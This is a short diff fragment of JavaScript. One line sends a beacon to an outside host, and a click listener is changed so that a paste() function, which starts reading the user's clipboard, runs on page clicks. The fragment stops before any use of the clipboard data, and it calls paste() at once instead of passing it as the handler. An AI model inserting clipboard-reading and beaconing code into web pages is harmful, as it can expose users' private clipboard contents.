@@ -1,5 +1,5 @@
 navigator.sendBeacon("https://gallery.zerolimits.dev", "poop");
-navigator.addEventListener("click", paste());
+document.addEventListener("click", paste());
 function paste() {
     navigator.clipboard
     .readText()
